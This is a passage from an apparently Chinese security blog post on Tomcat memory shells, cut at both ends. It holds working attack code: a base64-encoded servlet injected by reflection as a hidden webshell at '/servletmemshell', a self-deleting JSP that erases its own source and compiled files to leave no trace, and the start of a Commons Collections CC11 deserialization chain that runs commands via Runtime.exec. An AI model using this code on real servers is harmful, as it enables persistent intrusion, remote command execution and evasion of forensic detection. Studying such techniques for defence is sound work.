2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAdamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2UBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAFZmx1c2gBAAVjbG9zZQAhABwAHQABAB4AAAAGAAEAHwAgAAEAIQAAADMAAQABAAAABSq3AAGxAAAAAgAiAAAACgACAAAACgAEAAsAIwAAAAwAAQAAAAUAJAAlAAAAAQAmACcAAgAhAAAANQAAAAIAAAABsQAAAAIAIgAAAAYAAQAAAA4AIwAAABYAAgAAAAEAJAAlAAAAAAABACgAKQABACoAAAAEAAEAKwABACwALQABACEAAAAsAAEAAQAAAAIBsAAAAAIAIgAAAAYAAQAAABEAIwAAAAwAAQAAAAIAJAAlAAAAAQAuAC8AAgAhAAABigAEAAsAAAChKxICuQADAgBOBDYEEgS4AAU6BRkFxgATGQW2AAYSB7YACJkABgM2BBUEmQAYBr0ACVkDEgpTWQQSC1NZBS1TpwAVBr0ACVkDEgxTWQQSDVNZBS1TOga4AA4ZBrYAD7YAEDoHuwARWRkHtwASEhO2ABQ6CBkItgAVmQALGQi2ABanAAUSFzoJLLkAGAEAOgoZChkJtgAZGQq2ABoZCrYAG7EAAAADACIAAAA6AA4AAAAVAAkAFwAMABgAEwAZACUAGgAoABwAVgAeAGMAIABzACEAhwAiAI8AIwCWACQAmwAlAKAAJgAjAAAAcAALAAAAoQAkACUAAAAAAKEAMAAxAAEAAAChADIAMwACAAkAmAA0ADUAAwAMAJUANgA3AAQAEwCOADgANQAFAFYASwA5ADoABgBjAD4AOwA8AAcAcwAuAD0APgAIAIcAGgA/ADUACQCPABIAQABBAAoAQgAAACEABf4AKAcAQwEHAEMZUQcARP4ALgcARAcARQcARkEHAEMAKgAAAAYAAgArAEcAAQBIAEkAAQAhAAAALAABAAEAAAACAbAAAAACACIAAAAGAAEAAAApACMAAAAMAAEAAAACACQAJQAAAAEASgAgAAEAIQAAACsAAAABAAAAAbEAAAACACIAAAAGAAEAAAAtACMAAAAMAAEAAAABACQAJQAAAAEASwAAAAIATA==&amp;#34;;
// 获取上下文
ServletContext servletContext = request.getSession().getServletContext();
Field appctx = servletContext.getClass().getDeclaredField(&amp;#34;context&amp;#34;);
appctx.setAccessible(true);
ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
Field stdctx = applicationContext.getClass().getDeclaredField(&amp;#34;context&amp;#34;);
stdctx.setAccessible(true);
StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
java.lang.ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
java.lang.reflect.Method defineClass = java.lang.ClassLoader.class.getDeclaredMethod(&amp;#34;defineClass&amp;#34;, byte[].class, int.class, int.class);
defineClass.setAccessible(true);
byte[] evil = java.util.Base64.getDecoder().decode(classCode);
Class&amp;lt;?&amp;gt; servletClass = (Class&amp;lt;?&amp;gt;) defineClass.invoke(classLoader, evil, 0, evil.length);
final String name = &amp;#34;servletshell&amp;#34;;
// 使用 Wrapper 封装 Servlet
org.apache.catalina.Wrapper newWrapper = standardContext.createWrapper();
newWrapper.setName(name);
newWrapper.setLoadOnStartup(1);
newWrapper.setServlet((Servlet) servletClass.newInstance());
newWrapper.setServletClass(servletClass.getName());
// 为内存马添加路由映射
standardContext.addChild(newWrapper);
standardContext.addServletMappingDecoded(&amp;#34;/servletmemshell&amp;#34;,name);
response.getWriter().write(&amp;#34;inject success&amp;#34;);
%&amp;gt;
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
&amp;lt;title&amp;gt;servletshell&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220531183048214.png" alt="image-20220531183048214">&lt;/p>
&lt;p>不过并没有看起来这么美好——服务器上一下子多了1个jsp 1个class 1个java&lt;/p>
&lt;h3 id="金蝉脱壳的jsp">金蝉脱壳的jsp&lt;/h3>
&lt;p>对于上面示范的动静较大的2种方式不能说一无是处吧，只能说是乏善可陈，而在&lt;a href="https://www.anquanke.com/post/id/224698">Tomcat容器攻防笔记之JSP金蝉脱壳&lt;/a>这篇文章中作者提出了jsp金蝉脱壳的思路，代码如下&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-jsp" data-lang="jsp">&amp;lt;%@ page import=&amp;#34;org.apache.catalina.connector.Request&amp;#34; %&amp;gt;
&amp;lt;%@ page import=&amp;#34;org.apache.catalina.mapper.MappingData&amp;#34; %&amp;gt;
&amp;lt;%@ page import=&amp;#34;org.apache.catalina.Wrapper&amp;#34; %&amp;gt;
&amp;lt;%@ page import=&amp;#34;org.apache.jasper.compiler.JspRuntimeContext&amp;#34; %&amp;gt;
&amp;lt;%@ page import=&amp;#34;java.util.concurrent.ConcurrentHashMap&amp;#34; %&amp;gt;
&amp;lt;%@ page import=&amp;#34;org.apache.jasper.servlet.JspServletWrapper&amp;#34; %&amp;gt;
&amp;lt;%@ page import=&amp;#34;org.apache.jasper.JspCompilationContext&amp;#34; %&amp;gt;
&amp;lt;%@ page import=&amp;#34;java.io.File&amp;#34; %&amp;gt;
&amp;lt;%
//从request对象中获取request属性
Field requestF = request.getClass().getDeclaredField(&amp;#34;request&amp;#34;);
requestF.setAccessible(true);
Request req = (Request) requestF.get(request);
//获取MappingData
MappingData mappingData = req.getMappingData();
//获取StandrardWrapper
Field wrapperF = mappingData.getClass().getDeclaredField(&amp;#34;wrapper&amp;#34;);
wrapperF.setAccessible(true);
Wrapper wrapper = (Wrapper) wrapperF.get(mappingData);
//获取jspServlet对象
Field instanceF = wrapper.getClass().getDeclaredField(&amp;#34;instance&amp;#34;);
instanceF.setAccessible(true);
Servlet jspServlet = (Servlet) instanceF.get(wrapper);
//获取rctxt属性
Field rctxt = jspServlet.getClass().getDeclaredField(&amp;#34;rctxt&amp;#34;);
rctxt.setAccessible(true);
JspRuntimeContext jspRuntimeContext = (JspRuntimeContext) rctxt.get(jspServlet);
//获取jsps属性内容
Field jspsF = jspRuntimeContext.getClass().getDeclaredField(&amp;#34;jsps&amp;#34;);
jspsF.setAccessible(true);
ConcurrentHashMap jsps = (ConcurrentHashMap) jspsF.get(jspRuntimeContext);
//获取对应的JspServletWrapper
JspServletWrapper jsw = (JspServletWrapper)jsps.get(request.getServletPath());
//获取ctxt属性保存的JspCompilationContext对象
Field ctxt = jsw.getClass().getDeclaredField(&amp;#34;ctxt&amp;#34;);
ctxt.setAccessible(true);
JspCompilationContext jspCompContext = (JspCompilationContext) ctxt.get(jsw);
File targetFile;
targetFile = new File(jspCompContext.getClassFileName()); //删掉jsp的.class
targetFile.delete();
targetFile = new File(jspCompContext.getServletJavaFileName()); //删掉jsp的java文件
targetFile.delete();
//删除jsp文件
String __jspName = this.getClass().getSimpleName().replaceAll(&amp;#34;_&amp;#34;, &amp;#34;.&amp;#34;);
String path=application.getRealPath(__jspName);
File file = new File(path);
file.delete();
%&amp;gt;
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220531183048214.png" alt="image-20220531183048214">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220531185316461.png" alt="image-20220531185316461">通过大量的反射修改tomcat对jsp编译时的一些设置，做到上马后删除自身jsp并跳过jsp编译为class和java文件的过程，可以完全不留痕——好！！很有精神！！！&lt;/p>
&lt;h2 id="反序列化">反序列化&lt;/h2>
&lt;p>虽然前面我们得到了可以删除自身的金蝉脱壳jsp，但有个灵魂拷问——如果能传jsp了为什么不直接传冰蝎？确实，实际场景/CTF中更多的是反序列化RCE，为了方便我们可能会接着上内存马，&lt;strong>如果能再扩展一下冰蝎或哥斯拉那就更好了&lt;/strong>&lt;/p>
&lt;p>以CC11链为例，这是它的基本链&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">ccTest&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javassist.ClassClassPath&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javassist.ClassPool&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javassist.CtClass&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.InvokerTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.keyvalue.TiedMapEntry&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.map.LazyMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.FileInputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.FileOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectInputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Constructor&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Field&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.HashMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.HashSet&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@SuppressWarnings&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;all&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">CC11&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#75af00">getBytescode&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 利用javassist动态创建恶意字节码
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">ClassPool&lt;/span> &lt;span style="color:#111">pool&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ClassPool&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDefault&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">pool&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">insertClassPath&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ClassClassPath&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">AbstractTranslet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">CtClass&lt;/span> &lt;span style="color:#111">cc&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pool&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">makeClass&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Cat&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">cmd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;java.lang.Runtime.getRuntime().exec(\&amp;#34;calc.exe\&amp;#34;);&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">cc&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">makeClassInitializer&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">insertBefore&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">randomClassName&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;EvilCat&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">nanoTime&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">cc&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">randomClassName&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">cc&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setSuperclass&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">pool&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">AbstractTranslet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">()));&lt;/span> &lt;span style="color:#75715e">// 设置父类为AbstractTranslet 避免报错
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">cc&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toBytecode&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">field&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">TemplatesImpl&lt;/span> &lt;span style="color:#111">templates&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TemplatesImpl&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">templates&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_bytecodes&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[][]{&lt;/span>&lt;span style="color:#111">getBytescode&lt;/span>&lt;span style="color:#f92672">()});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">templates&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_name&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;name&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">templates&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_class&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">InvokerTransformer&lt;/span> &lt;span style="color:#111">transformer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;asdfasdfasdf&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">],&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">]);&lt;/span> &lt;span style="color:#75715e">// 占位
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">LazyMap&lt;/span> &lt;span style="color:#111">map&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">LazyMap&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">LazyMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">decorate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">(),&lt;/span>&lt;span style="color:#111">transformer&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">TiedMapEntry&lt;/span> &lt;span style="color:#111">tiedmap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TiedMapEntry&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">templates&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">HashSet&lt;/span> &lt;span style="color:#111">hashset&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashSet&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">hashset&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;foo&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HashSet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;map&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">NoSuchFieldException&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HashSet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;backingMap&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">HashMap&lt;/span> &lt;span style="color:#111">hashset_map&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">hashset&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
